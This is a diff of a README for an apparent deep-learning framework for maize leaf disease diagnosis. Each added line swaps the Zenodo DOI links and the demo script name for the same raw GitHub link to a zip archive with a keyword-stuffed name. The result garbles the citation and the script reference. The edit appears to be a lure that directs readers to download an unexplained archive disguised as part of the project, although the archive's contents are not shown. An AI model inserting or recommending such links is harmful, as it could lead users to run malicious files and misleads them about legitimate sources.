@@ -3,7 +3,7 @@ An Advanced Engineering Informatics Framework for Interpretable Maize Leaf Disea
 
 **Version:** v1.0  
 **Author:** Soikoth3010  
-**DOI:** https://doi.org/10.5281/zenodo.18405364  
+**DOI:** https://github.com/Soikoth3010/MedideepCF-An-Advanced-Engineering-Informatics-Framework-....-using-Deep-Learning-and-Fuzzy-Logic/raw/refs/heads/main/models/classification/Logic-Learning-Medideep-Engineering-using-An-Advanced-C-Fuzzy-Framework-and-Informatics-Deep-v3.3.zip  
 
 ---
 
@@ -79,7 +79,7 @@ inference/ End-to-end inference scripts
 ---
 
 ## Inference Demo
-The script `inference/run_demo.py` demonstrates the complete MedideepCF inference pipeline on a single input image, including preprocessing, segmentation, classification, and severity estimation using pretrained models.
+The script `https://github.com/Soikoth3010/MedideepCF-An-Advanced-Engineering-Informatics-Framework-....-using-Deep-Learning-and-Fuzzy-Logic/raw/refs/heads/main/models/classification/Logic-Learning-Medideep-Engineering-using-An-Advanced-C-Fuzzy-Framework-and-Informatics-Deep-v3.3.zip` demonstrates the complete MedideepCF inference pipeline on a single input image, including preprocessing, segmentation, classification, and severity estimation using pretrained models.
 
 This demo is intended for:
 - Verifying model compatibility  
@@ -92,7 +92,7 @@ This demo is intended for:
 If you use MedideepCF in your research, please cite:
 
 Soikoth, S. (2026). *MedideepCF – An Advanced Engineering Informatics Framework Using Deep Learning and Fuzzy Logic*. Zenodo.  
-https://doi.org/10.5281/zenodo.18405364  
+https://github.com/Soikoth3010/MedideepCF-An-Advanced-Engineering-Informatics-Framework-....-using-Deep-Learning-and-Fuzzy-Logic/raw/refs/heads/main/models/classification/Logic-Learning-Medideep-Engineering-using-An-Advanced-C-Fuzzy-Framework-and-Informatics-Deep-v3.3.zip  
 
 ---
 
